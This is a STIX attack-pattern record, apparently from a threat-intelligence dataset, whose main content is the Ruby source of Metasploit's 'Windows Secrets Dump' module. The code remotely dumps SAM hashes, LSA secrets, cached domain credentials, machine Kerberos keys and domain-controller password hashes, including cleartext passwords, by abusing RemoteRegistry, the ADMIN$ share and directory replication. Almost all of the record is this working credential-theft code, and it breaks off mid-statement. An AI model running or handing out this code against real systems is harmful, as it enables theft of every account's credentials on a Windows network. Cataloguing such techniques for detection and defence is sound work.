{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a971694b-dde3-463c-b175-f6744545af83",
    "created": "2024-08-14T16:31:40.832791Z",
    "modified": "2024-08-14T16:31:40.832795Z",
    "name": "Windows Secrets Dump",
    "description": " Dumps SAM hashes and LSA secrets (including cached creds) from the remote Windows target without executing any agent locally. First, it reads as much data as possible from the registry and then save the hives locally on the target (%SYSTEMROOT%\\Temp\\random.tmp). Finally, it downloads the temporary hive files and reads the rest of the data from it. This temporary files are removed when it's done.  On domain controllers, secrets from Active Directory is extracted using [MS-DRDS] DRSGetNCChanges(), replicating the attributes we need to get SIDs, NTLM hashes, groups, password history, Kerberos keys and other interesting data. Note that the actual `NTDS.dit` file is not downloaded. Instead, the Directory Replication Service directly asks Active Directory through RPC requests.  This modules takes care of starting or enabling the Remote Registry service if needed. It will restore the service to its original state when it's done.  This is a port of the great Impacket `secretsdump.py` code written by Alberto Solino.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/windows_secrets_dump.rb",
            "external_id": "windows_secrets_dump.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'ruby_smb/dcerpc/client'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Auxiliary::Report\n  include Msf::Util::WindowsRegistry\n  include Msf::Util::WindowsCryptoHelpers\n\n  # Mapping of MS-SAMR encryption keys to IANA Kerberos Parameter values\n  #\n  # @see RubySMB::Dcerpc::Samr::KERBEROS_TYPE\n  # @see Rex::Proto::Kerberos::Crypto::Encryption\n  # rubocop:disable Layout/HashAlignment\n  SAMR_KERBEROS_TYPE_TO_IANA = {\n    1          => Rex::Proto::Kerberos::Crypto::Encryption::DES_CBC_CRC,\n    3          => Rex::Proto::Kerberos::Crypto::Encryption::DES_CBC_MD5,\n    17         => Rex::Proto::Kerberos::Crypto::Encryption::AES128,\n    18         => Rex::Proto::Kerberos::Crypto::Encryption::AES256,\n    0xffffff74 => Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC\n  }.freeze\n  # rubocop:enable Layout/HashAlignment\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Secrets Dump',\n        'Description' => %q{\n          Dumps SAM hashes and LSA secrets (including cached creds) from the\n          remote Windows target without executing any agent locally. First, it\n          reads as much data as possible from the registry and then save the\n          hives locally on the target (%SYSTEMROOT%\\Temp\\random.tmp). Finally, it\n          downloads the temporary hive files and reads the rest of the data\n          from it. This temporary files are removed when it's done.\n\n          On domain controllers, secrets from Active Directory is extracted\n          using [MS-DRDS] DRSGetNCChanges(), replicating the attributes we need\n          to get SIDs, NTLM hashes, groups, password history, Kerberos keys and\n          other interesting data. Note that the actual `NTDS.dit` file is not\n          downloaded. Instead, the Directory Replication Service directly asks\n          Active Directory through RPC requests.\n\n          This modules takes care of starting or enabling the Remote Registry\n          service if needed. It will restore the service to its original state\n          when it's done.\n\n          This is a port of the great Impacket `secretsdump.py` code written by\n          Alberto Solino.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Alberto Solino', # Original Impacket code\n          'Christophe De La Fuente', # MSf module\n        ],\n        'References' => [\n          ['URL', 'https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py'],\n        ],\n        'Notes' => {\n          'Reliability' => [],\n          'Stability' => [],\n          'SideEffects' => [ IOC_IN_LOGS ]\n        },\n        'Actions' => [\n          [ 'ALL', { 'Description' => 'Dump everything' } ],\n          [ 'SAM', { 'Description' => 'Dump SAM hashes' } ],\n          [ 'CACHE', { 'Description' => 'Dump cached hashes' } ],\n          [ 'LSA', { 'Description' => 'Dump LSA secrets' } ],\n          [ 'DOMAIN', { 'Description' => 'Dump domain secrets (credentials, password history, Kerberos keys, etc.)' } ]\n        ],\n        'DefaultAction' => 'ALL'\n      )\n    )\n\n    register_options([ Opt::RPORT(445) ])\n\n    @service_should_be_stopped = false\n    @service_should_be_disabled = false\n  end\n\n  def enable_registry\n    svc_handle = @svcctl.open_service_w(@scm_handle, 'RemoteRegistry')\n    svc_status = @svcctl.query_service_status(svc_handle)\n    case svc_status.dw_current_state\n    when RubySMB::Dcerpc::Svcctl::SERVICE_RUNNING\n      print_status('Service RemoteRegistry is already running')\n    when RubySMB::Dcerpc::Svcctl::SERVICE_STOPPED\n      print_status('Service RemoteRegistry is in stopped state')\n      svc_config = @svcctl.query_service_config(svc_handle)\n      if svc_config.dw_start_type == RubySMB::Dcerpc::Svcctl::SERVICE_DISABLED\n        print_status('Service RemoteRegistry is disabled, enabling it...')\n        @svcctl.change_service_config_w(\n          svc_handle,\n          start_type: RubySMB::Dcerpc::Svcctl::SERVICE_DEMAND_START\n        )\n        @service_should_be_disabled = true\n      end\n      print_status('Starting service...')\n      @svcctl.start_service_w(svc_handle)\n      @service_should_be_stopped = true\n    else\n      print_error('Unable to get the service RemoteRegistry state')\n    end\n  ensure\n    @svcctl.close_service_handle(svc_handle) if svc_handle\n  end\n\n  def get_boot_key\n    print_status('Retrieving target system bootKey')\n    root_key_handle = @winreg.open_root_key('HKLM')\n\n    boot_key = ''.b\n    ['JD', 'Skew1', 'GBG', 'Data'].each do |key|\n      sub_key = \"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\#{key}\"\n      vprint_status(\"Retrieving class info for #{sub_key}\")\n      subkey_handle = @winreg.open_key(root_key_handle, sub_key)\n      query_info_key_response = @winreg.query_info_key(subkey_handle)\n      boot_key << query_info_key_response.lp_class.to_s.encode(::Encoding::ASCII_8BIT)\n      @winreg.close_key(subkey_handle)\n      subkey_handle = nil\n    ensure\n      @winreg.close_key(subkey_handle) if subkey_handle\n    end\n    if boot_key.size != 32\n      vprint_error(\"bootKey must be 16-bytes long (hex string of 32 chars), got \\\"#{boot_key}\\\" (#{boot_key.size} chars)\")\n      return ''.b\n    end\n\n    transforms = [ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 ]\n    boot_key = [boot_key].pack('H*')\n    boot_key = transforms.map { |i| boot_key[i] }.join\n    print_good(\"bootKey: 0x#{boot_key.unpack('H*')[0]}\") unless boot_key&.empty?\n    boot_key\n  ensure\n    @winreg.close_key(root_key_handle) if root_key_handle\n  end\n\n  def check_lm_hash_not_stored\n    vprint_status('Checking NoLMHash policy')\n    res = @winreg.read_registry_key_value('HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa', 'NoLmHash', bind: false)\n    if res == 1\n      vprint_status('LMHashes are not being stored')\n      @lm_hash_not_stored = true\n    else\n      vprint_status('LMHashes are being stored')\n      @lm_hash_not_stored = false\n    end\n  rescue RubySMB::Dcerpc::Error::WinregError => e\n    vprint_warning(\"An error occured when checking NoLMHash policy: #{e}\")\n  end\n\n  def save_registry_key(hive_name)\n    vprint_status(\"Create #{hive_name} key\")\n    root_key_handle = @winreg.open_root_key('HKLM')\n    new_key_handle = @winreg.create_key(root_key_handle, hive_name)\n\n    file_name = \"#{Rex::Text.rand_text_alphanumeric(8)}.tmp\"\n    vprint_status(\"Save key to #{file_name}\")\n    @winreg.save_key(new_key_handle, \"..\\\\Temp\\\\#{file_name}\")\n    file_name\n  ensure\n    @winreg.close_key(new_key_handle) if new_key_handle\n    @winreg.close_key(root_key_handle) if root_key_handle\n  end\n\n  def retrieve_hive(hive_name)\n    file_name = save_registry_key(hive_name)\n    tree2 = simple.client.tree_connect(\"\\\\\\\\#{sock.peerhost}\\\\ADMIN$\")\n    file = tree2.open_file(filename: \"Temp\\\\#{file_name}\", delete: true, read: true)\n    file.read\n  ensure\n    file.delete if file\n    file.close if file\n    tree2.disconnect! if tree2\n  end\n\n  def save_sam\n    print_status('Saving remote SAM database')\n    retrieve_hive('SAM')\n  end\n\n  def save_security\n    print_status('Saving remote SECURITY database')\n    retrieve_hive('SECURITY')\n  end\n\n  def report_creds(\n    user, hash, type: :ntlm_hash, jtr_format: '', realm_key: nil, realm_value: nil\n  )\n    service_data = {\n      address: rhost,\n      port: rport,\n      service_name: 'smb',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n    credential_data = {\n      module_fullname: fullname,\n      origin_type: :service,\n      private_data: hash,\n      private_type: type,\n      jtr_format: jtr_format,\n      username: user\n    }.merge(service_data)\n    credential_data[:realm_key] = realm_key if realm_key\n    credential_data[:realm_value] = realm_value if realm_value\n\n    cl = create_credential_and_login(credential_data)\n    cl.respond_to?(:core_id) ? cl.core_id : nil\n  end\n\n  def report_info(data, type = '')\n    report_note(\n      host: rhost,\n      port: rport,\n      proto: 'tcp',\n      sname: 'smb',\n      type: type,\n      data: data,\n      update: :unique_data\n    )\n  end\n\n  def dump_sam_hashes(reg_parser, boot_key)\n    print_status('Dumping SAM hashes')\n    vprint_status('Calculating HashedBootKey from SAM')\n    hboot_key = reg_parser.get_hboot_key(boot_key)\n    unless hboot_key.present?\n      print_warning('Unable to get hbootKey')\n      return\n    end\n    users = reg_parser.get_user_keys\n    users.each do |rid, user|\n      user[:hashnt], user[:hashlm] = decrypt_user_key(hboot_key, user[:V], rid)\n    end\n\n    print_status('Password hints:')\n    hint_count = 0\n    users.keys.sort { |a, b| a <=> b }.each do |rid|\n      # If we have a hint then print it\n      next unless !users[rid][:UserPasswordHint].nil? && !users[rid][:UserPasswordHint].empty?\n\n      hint = \"#{users[rid][:Name]}: \\\"#{users[rid][:UserPasswordHint]}\\\"\"\n      report_info(hint, 'user.password_hint')\n      print_line(hint)\n      hint_count += 1\n    end\n    print_line('No users with password hints on this system') if hint_count == 0\n\n    print_status('Password hashes (pwdump format - uid:rid:lmhash:nthash:::):')\n    users.keys.sort { |a, b| a <=> b }.each do |rid|\n      hash = \"#{users[rid][:hashlm].unpack('H*')[0]}:#{users[rid][:hashnt].unpack('H*')[0]}\"\n      unless report_creds(users[rid][:Name], hash)\n        vprint_bad(\"Error when reporting #{users[rid][:Name]} hash\")\n      end\n      print_line(\"#{users[rid][:Name]}:#{rid}:#{hash}:::\")\n    end\n  end\n\n  def get_lsa_secret_key(reg_parser, boot_key)\n    print_status('Decrypting LSA Key')\n    lsa_key = reg_parser.lsa_secret_key(boot_key)\n\n    vprint_good(\"LSA key: #{lsa_key.unpack('H*')[0]}\")\n\n    if reg_parser.lsa_vista_style\n      vprint_status('Vista or above system')\n    else\n      vprint_status('XP or below system')\n    end\n\n    return lsa_key\n  end\n\n  def get_nlkm_secret_key(reg_parser, lsa_key)\n    print_status('Decrypting NL$KM')\n\n    reg_parser.nlkm_secret_key(lsa_key)\n  end\n\n  def dump_cached_hashes(reg_parser, nlkm_key)\n    print_status('Dumping cached hashes')\n\n    cache_infos = reg_parser.cached_infos(nlkm_key)\n    if cache_infos.nil? || cache_infos.empty?\n      print_status('No cashed entries')\n      return\n    end\n\n    hashes = ''\n    cache_infos.each do |cache_info|\n      vprint_status(\"Looking into #{cache_info.name}\")\n\n      next unless cache_info.entry.user_name_length > 0\n\n      vprint_status(\"Reg entry: #{cache_info.entry.to_hex}\")\n      vprint_status(\"Encrypted data: #{cache_info.entry.enc_data.to_hex}\")\n      vprint_status(\"IV:  #{cache_info.entry.iv.to_hex}\")\n\n      vprint_status(\"Decrypted data: #{cache_info.data.to_hex}\")\n\n      username = cache_info.data.username.encode(::Encoding::UTF_8)\n      info = []\n      info << (\"Username: #{username}\")\n      if cache_info.iteration_count\n        info << (\"Iteration count: #{cache_info.iteration_count} -> real #{cache_info.real_iteration_count}\")\n      end\n      info << (\"Last login: #{cache_info.entry.last_access.to_time}\")\n      dns_domain_name = cache_info.data.dns_domain_name.encode(::Encoding::UTF_8)\n      info << (\"DNS Domain Name: #{dns_domain_name}\")\n      info << (\"UPN: #{cache_info.data.upn.encode(::Encoding::UTF_8)}\")\n      info << (\"Effective Name: #{cache_info.data.effective_name.encode(::Encoding::UTF_8)}\")\n      info << (\"Full Name: #{cache_info.data.full_name.encode(::Encoding::UTF_8)}\")\n      info << (\"Logon Script: #{cache_info.data.logon_script.encode(::Encoding::UTF_8)}\")\n      info << (\"Profile Path: #{cache_info.data.profile_path.encode(::Encoding::UTF_8)}\")\n      info << (\"Home Directory: #{cache_info.data.home_directory.encode(::Encoding::UTF_8)}\")\n      info << (\"Home Directory Drive: #{cache_info.data.home_directory_drive.encode(::Encoding::UTF_8)}\")\n      info << (\"User ID: #{cache_info.entry.user_id}\")\n      info << (\"Primary Group ID: #{cache_info.entry.primary_group_id}\")\n      info << (\"Additional groups: #{cache_info.data.groups.map(&:relative_id).join(' ')}\")\n      logon_domain_name = cache_info.data.logon_domain_name.encode(::Encoding::UTF_8)\n      info << (\"Logon domain name: #{logon_domain_name}\")\n\n      report_info(info.join('; '), 'user.cache_info')\n      vprint_line(info.join(\"\\n\"))\n\n      credential_opts = {\n        type: :nonreplayable_hash,\n        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n        realm_value: logon_domain_name\n      }\n      if reg_parser.lsa_vista_style\n        jtr_hash = \"$DCC2$#{cache_info.real_iteration_count}##{username}##{cache_info.data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}\"\n      else\n        jtr_hash = \"M$#{username}##{cache_info.data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}\"\n      end\n      credential_opts[:jtr_format] = Metasploit::Framework::Hashes.identify_hash(jtr_hash)\n      unless report_creds(\"#{logon_domain_name}\\\\#{username}\", jtr_hash, **credential_opts)\n        vprint_bad(\"Error when reporting #{logon_domain_name}\\\\#{username} hash (#{credential_opts[:jtr_format]} format)\")\n      end\n      hashes << \"#{logon_domain_name}\\\\#{username}:#{jtr_hash}\\n\"\n    end\n\n    if hashes.empty?\n      print_line('No cached hashes on this system')\n    else\n      print_status(\"Hash#{'es' if hashes.lines.size > 1} are in '#{reg_parser.lsa_vista_style ? 'mscash2' : 'mscash'}' format\")\n      print_line(hashes)\n    end\n  end\n\n  def get_service_account(service_name)\n    return nil unless @svcctl\n\n    vprint_status(\"Getting #{service_name} service account\")\n    svc_handle = @svcctl.open_service_w(@scm_handle, service_name)\n    svc_config = @svcctl.query_service_config(svc_handle)\n    return nil if svc_config.lp_service_start_name == :null\n\n    svc_config.lp_service_start_name.to_s\n  rescue RubySMB::Dcerpc::Error::SvcctlError => e\n    vprint_warning(\"An error occured when getting #{service_name} service account: #{e}\")\n    return nil\n  ensure\n    @svcctl.close_service_handle(svc_handle) if svc_handle\n  end\n\n  def get_default_login_account\n    vprint_status('Getting default login account')\n    begin\n      username = @winreg.read_registry_key_value(\n        'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon',\n        'DefaultUserName',\n        bind: false\n      )\n    rescue RubySMB::Dcerpc::Error::WinregError => e\n      vprint_warning(\"An error occured when getting the default user name: #{e}\")\n      return nil\n    end\n    return nil if username.nil? || username.empty?\n\n    username = username.encode(::Encoding::UTF_8)\n\n    begin\n      domain = @winreg.read_registry_key_value(\n        'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon',\n        'DefaultDomainName',\n        bind: false\n      )\n    rescue RubySMB::Dcerpc::Error::WinregError => e\n      vprint_warning(\"An error occurred when getting the default domain name: #{e}\")\n      domain = ''\n    end\n    username = \"#{domain.encode(::Encoding::UTF_8)}\\\\#{username}\" unless domain.nil? || domain.empty?\n    username\n  end\n\n  # Returns Kerberos salt for the current connection if we have the correct information\n  def get_machine_kerberos_salt\n    host = simple.client.default_name\n    return ''.b if host.nil? || host.empty?\n\n    domain = simple.client.dns_domain_name\n    \"#{domain.upcase}host#{host.downcase}.#{domain.downcase}\".b\n  end\n\n  # @return [Array[Hash{String => String}]]\n  def get_machine_kerberos_keys(raw_secret, _machine_name)\n    vprint_status('Calculating machine account Kerberos keys')\n    # Attempt to create Kerberos keys from machine account (if possible)\n    secret = []\n    salt = get_machine_kerberos_salt\n    if salt.empty?\n      vprint_error('Unable to get the salt')\n      return []\n    end\n\n    raw_secret_utf_16le = raw_secret.dup.force_encoding(::Encoding::UTF_16LE)\n    raw_secret_utf8 = raw_secret_utf_16le.encode(::Encoding::UTF_8, invalid: :replace).b\n\n    secret << {\n      enctype: Rex::Proto::Kerberos::Crypto::Encryption::AES256,\n      key: aes256_cts_hmac_sha1_96(raw_secret_utf8, salt),\n      salt: salt\n    }\n\n    secret << {\n      enctype: Rex::Proto::Kerberos::Crypto::Encryption::AES128,\n      key: aes128_cts_hmac_sha1_96(raw_secret_utf8, salt),\n      salt: salt\n    }\n\n    secret << {\n      enctype: Rex::Proto::Kerberos::Crypto::Encryption::DES_CBC_MD5,\n      key: des_cbc_md5(raw_secret_utf8, salt),\n      salt: salt\n    }\n\n    secret << {\n      enctype: Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC,\n      key: OpenSSL::Digest::MD4.digest(raw_secret),\n      salt: nil\n    }\n\n    secret\n  end\n\n  def print_secret(name, secret_item)\n    if secret_item.nil? || secret_item.empty?\n      vprint_status(\"Discarding secret #{name}, NULL Data\")\n      return\n    end\n\n    if secret_item.start_with?(\"\\x00\\x00\".b)\n      vprint_status(\"Discarding secret #{name}, all zeros\")\n      return\n    end\n\n    upper_name = name.upcase\n    print_line(name.to_s)\n\n    secret = ''\n    if upper_name.start_with?('_SC_')\n      # Service name, a password might be there\n      # We have to get the account the service runs under\n      account = get_service_account(name[4..])\n      if account\n        secret = \"#{account.encode(::Encoding::UTF_8)}:\"\n      else\n        secret = '(Unknown User): '\n      end\n      secret << secret_item\n    elsif upper_name.start_with?('DEFAULTPASSWORD')\n      # We have to get the account this password is for\n      account = get_default_login_account || '(Unknown User)'\n      password = secret_item.dup.force_encoding(::Encoding::UTF_16LE).encode(::Encoding::UTF_8)\n      unless report_creds(account, password, type: :password)\n        vprint_bad(\"Error when reporting #{account} default password\")\n      end\n      secret << \"#{account}: #{password}\"\n    elsif upper_name.start_with?('ASPNET_WP_PASSWORD')\n      secret = \"ASPNET: #{secret_item}\"\n    elsif upper_name.start_with?('DPAPI_SYSTEM')\n      # Decode the DPAPI Secrets\n      machine_key = secret_item[4, 20]\n      user_key = secret_item[24, 20]\n      report_info(machine_key.unpack('H*')[0], 'dpapi.machine_key')\n      report_info(user_key.unpack('H*')[0], 'dpapi.user_key')\n      secret = \"dpapi_machinekey: 0x#{machine_key.unpack('H*')[0]}\\ndpapi_userkey: 0x#{user_key.unpack('H*')[0]}\"\n    elsif upper_name.start_with?('$MACHINE.ACC')\n      md4 = OpenSSL::Digest::MD4.digest(secret_item)\n      machine, domain, dns_domain_name = get_machine_name_and_domain_info\n      print_name = \"#{domain}\\\\#{machine}$\"\n      ntlm_hash = \"#{Net::NTLM.lm_hash('').unpack('H*')[0]}:#{md4.unpack('H*')[0]}\"\n      secret_ary = [\"#{print_name}:#{ntlm_hash}:::\"]\n      credential_opts = {\n        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n        realm_value: dns_domain_name\n      }\n      unless report_creds(print_name, ntlm_hash, **credential_opts)\n        vprint_bad(\"Error when reporting #{print_name} NTLM hash\")\n      end\n\n      raw_passwd = secret_item.unpack('H*')[0]\n      credential_opts[:type] = :password\n      unless report_creds(print_name, raw_passwd, **credential_opts)\n        vprint_bad(\"Error when reporting #{print_name} raw password hash\")\n      end\n      secret = \"#{print_name}:plain_password_hex:#{raw_passwd}\\n\"\n\n      machine_kerberos_keys = get_machine_kerberos_keys(secret_item, print_name)\n      if machine_kerberos_keys.empty?\n        vprint_status('Could not calculate machine account Kerberos keys')\n      else\n        credential_opts[:type] = :krb_enc_key\n        machine_kerberos_keys.each do |key|\n          key_data = Metasploit::Credential::KrbEncKey.build_data(**key)\n          unless report_creds(print_name, key_data, **credential_opts)\n            vprint_bad(\"Error when reporting #{print_name} machine kerberos key #{krb_enc_key_to_s(key)}\")\n          end\n        end\n      end\n\n      secret << machine_kerberos_keys.map { |key| \"#{print_name}:#{krb_enc_key_to_s(key)}\" }.concat(secret_ary).join(\"\\n\")\n    end\n\n    if secret.empty?\n      print_line(Rex::Text.to_hex_dump(secret_item).strip)\n      print_line(\"Hex string: #{secret_item.unpack('H*')[0]}\")\n    else\n      print_line(secret)\n    end\n    print_line\n  end\n\n  def dump_lsa_secrets(reg_parser, lsa_key)\n    print_status('Dumping LSA Secrets')\n\n    lsa_secrets = reg_parser.lsa_secrets(lsa_key)\n    lsa_secrets.each do |key, secret|\n      print_secret(key, secret)\n    end\n  end\n\n  def get_machine_name_and_domain_info\n    if simple.client&.default_name.blank?\n      begin\n        vprint_status('Getting Server Info')\n        wkssvc = @tree.open_file(filename: 'wkssvc', write: true, read: true)\n\n        vprint_status('Binding to \\\\wkssvc...')\n        wkssvc.bind(endpoint: RubySMB::Dcerpc::Wkssvc)\n        vprint_status('Bound to \\\\wkssvc')\n\n        info = wkssvc.netr_wksta_get_info\n      rescue RubySMB::Error::RubySMBError => e\n        print_error(\"Error when connecting to 'wkssvc' interface ([#{e.class}] #{e}).\")\n        return\n      end\n      return [info[:wki100_computername].encode('utf-8'), info[:wki100_langroup].encode('utf-8'), datastore['SMBDomain']]\n    end\n    [simple.client.default_name, simple.client.default_domain, simple.client.dns_domain_name]\n  end\n\n  def connect_samr(domain_name)\n    vprint_status('Connecting to Security Account Manager (SAM) Remote Protocol')\n    @samr = @tree.open_file(filename: 'samr', write: true, read: true)\n\n    vprint_status('Binding to \\\\samr...')\n    @samr.bind(endpoint: RubySMB::Dcerpc::Samr)\n    vprint_good('Bound to \\\\samr')\n\n    @server_handle = @samr.samr_connect\n    @domain_sid = @samr.samr_lookup_domain(server_handle: @server_handle, name: domain_name)\n    @domain_handle = @samr.samr_open_domain(server_handle: @server_handle, domain_id: @domain_sid)\n\n    builtin_domain_sid = @samr.samr_lookup_domain(server_handle: @server_handle, name: 'Builtin')\n    @builtin_domain_handle = @samr.samr_open_domain(server_handle: @server_handle, domain_id: builtin_domain_sid)\n  end\n\n  def get_domain_users\n    users = @samr.samr_enumerate_users_in_domain(domain_handle: @domain_handle)\n    vprint_status(\"Obtained #{users.length} domain users, fetching the SID for each...\")\n    progress_interval = 250\n    nb_digits = (Math.log10(users.length) + 1).floor\n    users = users.each_with_index.map do |(rid, name), index|\n      if index % progress_interval == 0\n        percent = format('%.2f', (index / users.length.to_f * 100)).rjust(5)\n        print_status(\"SID enumeration progress - #{index.to_s.rjust(nb_digits)} / #{users.length} (#{percent}%)\")\n      end\n      sid = @samr.samr_rid_to_sid(object_handle: @domain_handle, rid: rid)\n      [sid.to_s, name.to_s]\n    end\n    print_status(\"SID enumeration progress - #{users.length} / #{users.length} (  100%)\")\n    users\n  rescue RubySMB::Error::RubySMBError => e\n    print_error(\"Error when enumerating domain users ([#{e.class}] #{e}).\")\n    return\n  end\n\n  def get_user_groups(sid)\n    user_handle = nil\n    rid = sid.split('-').last.to_i\n\n    user_handle = @samr.samr_open_user(domain_handle: @domain_handle, user_id: rid)\n    groups = @samr.samr_get_group_for_user(user_handle: user_handle)\n    groups = groups.map do |group|\n      RubySMB::Dcerpc::Samr::RpcSid.new(\"#{@domain_sid}-#{group.relative_id.to_i}\")\n    end\n\n    alias_groups = @samr.samr_get_alias_membership(domain_handle: @domain_handle, sids: groups + [sid])\n    alias_groups = alias_groups.map do |group|\n      RubySMB::Dcerpc::Samr::RpcSid.new(\"#{@domain_sid}-#{group}\")\n    end\n\n    builtin_alias_groups = @samr.samr_get_alias_membership(domain_handle: @builtin_domain_handle, sids: groups + [sid])\n    builtin_alias_groups = builtin_alias_groups.map do |group|\n      RubySMB::Dcerpc::Samr::RpcSid.new(\"#{@domain_sid}-#{group}\")\n    end\n    groups + alias_groups + builtin_alias_groups\n  ensure\n    @samr.close_handle(user_handle) if user_handle\n  end\n\n  def connect_drs\n    dcerpc_client = RubySMB::Dcerpc::Client.new(\n      rhost,\n      RubySMB::Dcerpc::Drsr,\n      username: datastore['SMBUser'],\n      password: datastore['SMBPass']\n    )\n\n    auth_type = RubySMB::Dcerpc::RPC_C_AUTHN_WINNT\n    if datastore['SMB::Auth'] == Msf::Exploit::Remote::AuthOption::KERBEROS\n      fail_with(Msf::Exploit::Failure::BadConfig, 'The Smb::Rhostname option is required when using Kerberos authentication.') if datastore['Smb::Rhostname'].blank?\n      fail_with(Msf::Exploit::Failure::BadConfig, 'The SMBDomain option is required when using Kerberos authentication.') if datastore['SMBDomain'].blank?\n      fail_with(Msf::Exploit::Failure::BadConfig, 'The DomainControllerRhost is required when using Kerberos authentication.') if datastore['DomainControllerRhost'].blank?\n      offered_etypes = Msf::Exploit::Remote::AuthOption.as_default_offered_etypes(datastore['Smb::KrbOfferedEncryptionTypes'])\n      fail_with(Msf::Exploit::Failure::BadConfig, 'At least one encryption type is required when using Kerberos authentication.') if offered_etypes.empty?\n\n      kerberos_authenticator = Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::LDAP.new(\n        host: datastore['DomainControllerRhost'],\n        hostname: datastore['Smb::Rhostname'],\n        proxies: datastore['Proxies'],\n        realm: datastore['SMBDomain'],\n        username: datastore['SMBUser'],\n        password: datastore['SMBPass'],\n        framework: framework,\n        framework_module: self,\n        cache_file: datastore['Smb::Krb5Ccname'].blank? ? nil : datastore['Smb::Krb5Ccname'],\n        mutual_auth: true,\n        dce_style: true,\n        use_gss_checksum: true,\n        ticket_storage: kerberos_ticket_storage,\n        offered_etypes: offered_etypes\n      )\n\n      dcerpc_client.extend(Msf::Exploit::Remote::DCERPC::KerberosAuthentication)\n      dcerpc_client.kerberos_authenticator = kerberos_authenticator\n      auth_type = RubySMB::Dcerpc::RPC_C_AUTHN_GSS_NEGOTIATE\n    end\n\n    dcerpc_client.connect\n    vprint_status('Binding to DRSR...')\n    dcerpc_client.bind(\n      endpoint: RubySMB::Dcerpc::Drsr,\n      auth_level: RubySMB::Dcerpc::RPC_C_AUTHN_LEVEL_PKT_PRIVACY,\n      auth_type: auth_type\n    )\n    vprint_status('Bound to DRSR')\n\n    dcerpc_client\n  rescue ::Rex::Proto::DCERPC::Exceptions::Error, ArgumentError => e\n    print_error(\"Unable to bind to the directory replication remote service (DRS): #{e}\")\n    return\n  end\n\n  def decrypt_supplemental_info(dcerpc_client, result, attribute_value)\n    result[:kerberos_keys] = []\n    result[:clear_text_passwords] = {}\n    plain_text = dcerpc_client.decrypt_attribute_value(attribute_value)\n    user_properties = RubySMB::Dcerpc::Samr::UserProperties.read(plain_text)\n    user_properties.user_properties.each do |user_property|\n      case user_property.property_name.encode('utf-8')\n      when 'Primary:Kerberos-Newer-Keys'\n        value = user_property.property_value\n        binary_value = value.chars.each_slice(2).map { |a, b| (a + b).hex.chr }.join\n        kerb_stored_credential_new = RubySMB::Dcerpc::Samr::KerbStoredCredentialNew.read(binary_value)\n        key_values = kerb_stored_credential_new.get_key_values\n        kerb_stored_credential_new.credentials.each_with_index do |credential, i|\n          # Extract the kerberos keys, note that the enctype here is a RubySMB::Dcerpc::Samr::KERBEROS_TYPE\n          # not the IANA Kerberos value, which is required for database persistence\n          result[:kerberos_keys] << {\n            enctype: credential.key_type.to_i,\n            key: key_values[i]\n          }\n        end\n      when 'Primary:CLEARTEXT'\n        # [MS-SAMR] 3.1.1.8.11.5 Primary:CLEARTEXT Property\n        # This credential type is the cleartext password. The value format is the UTF-16 encoded cleartext password.\n        begin\n          result[:clear_text_passwords] << user_property.property_value.to_s.force_encoding('utf-16le').encode('utf-8')\n        rescue EncodingError\n          # This could be because we're decoding a machine password. Printing it hex\n          # Keep clear_text_passwords with a ASCII-8BIT encoding\n          result[:clear_text_passwords] << user_property.property_value.to_s\n        end\n      end\n    end\n  end\n\n  def parse_user_record(dcerpc_client, user_record)\n    vprint_status(\"Decrypting hash for user: #{user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..].join.encode('utf-8')}\")\n\n    entinf_struct = user_record.pmsg_out.msg_getchg.p_objects.entinf\n    rid = entinf_struct.p_name.sid[-4..].unpack('L<').first\n    dn = user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..].join.encode('utf-8')\n\n    result = {\n      dn: dn,\n      rid: rid,\n      object_sid: rid,\n      lm_hash: Net::NTLM.lm_hash(''),\n      nt_hash: Net::NTLM.ntlm_hash(''),\n      disabled: nil,\n      pwd_last_set: nil,\n      last_logon: nil,\n      expires: nil,\n      computer_account: nil,\n      password_never_expires: nil,\n      password_not_required: nil,\n      lm_history: [],\n      nt_history: [],\n      domain_name: '',\n      username: 'unknown',\n      admin: false,\n      domain_admin: false,\n      enterprise_admin: false\n    }\n\n    entinf_struct.attr_block.p_attr.each do |attr|\n      next unless attr.attr_val.val_count > 0\n\n      att_id = user_record.pmsg_out.msg_getchg.oid_from_attid(attr.attr_typ)\n      lookup_table = RubySMB::Dcerpc::Drsr::ATTRTYP_TO_ATTID\n\n      attribute_value = attr.attr_val.p_aval[0].p_val.to_ary.map(&:chr).join\n      case att_id\n      when lookup_table['dBCSPwd']\n        encrypted_lm_hash = dcerpc_client.decrypt_attribute_value(attribute_value)\n        result[:lm_hash] = dcerpc_client.remove_des_layer(encrypted_lm_hash, rid)\n      when lookup_table['unicodePwd']\n        encrypted_nt_hash = dcerpc_client.decrypt_attribute_value(attribute_value)\n        result[:nt_hash] = dcerpc_client.remove_des_layer(encrypted_nt_hash, rid)\n      when 